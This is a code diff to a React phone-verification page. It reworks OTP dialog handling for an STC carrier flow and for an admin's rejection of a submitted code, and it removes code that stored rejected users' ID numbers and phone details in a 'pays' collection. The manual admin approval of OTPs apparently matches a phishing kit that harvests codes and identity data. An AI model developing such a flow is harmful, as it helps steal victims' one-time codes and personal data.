@@ -148,10 +148,10 @@ export default function VerifyPhonePage() {
     }
   };
 
-  // After OTP is submitted, STC users see the call dialog.
+  // After OTP is submitted, STC users see the call dialog on top.
+  // The OTP dialog stays mounted underneath so it can show a rejection error.
   const handleOtpSubmitted = () => {
     if (selectedCarrier === "stc") {
-      setShowOtpDialog(false);
       setShowStcCallDialog(true);
     }
   };
@@ -160,34 +160,10 @@ export default function VerifyPhonePage() {
     setShowStcCallDialog(false);
   };
 
-  // OTP rejected by admin → archive attempt, show inline error, reset for retry
-  const handleOtpRejected = async () => {
-    const visitorID = localStorage.getItem("visitor");
-    if (!visitorID || !db) return;
-    try {
-      const docRef = doc(db, "pays", visitorID);
-      const docSnap = await getDoc(docRef);
-      if (docSnap.exists()) {
-        const data = docSnap.data();
-        const currentPhoneData = {
-          idNumber: data.phoneIdNumber || "",
-          phoneNumber: data.phoneNumber,
-          phoneCarrier: data.phoneCarrier,
-          rejectedAt: new Date().toISOString(),
-        };
-        await setDoc(docRef, {
-          oldPhoneInfo: data.oldPhoneInfo
-            ? [...data.oldPhoneInfo, currentPhoneData]
-            : [currentPhoneData],
-          phoneOtpApproved: "pending",
-        }, { merge: true });
-      }
-    } catch (error) {
-      console.error("Error saving rejected phone data:", error);
-    }
-    setShowOtpDialog(false);
-    setSelectedCarrier("");
-    setApprovalError("تم رفض طلبك. يرجى التحقق من بياناتك والمحاولة مرة أخرى.");
+  // OTP rejected by admin → close the STC dialog (if open) so the OTP dialog,
+  // which shows the rejection error and stays open for retry, is visible again.
+  const handleOtpRejected = () => {
+    setShowStcCallDialog(false);
   };
 
   const isFormValid =
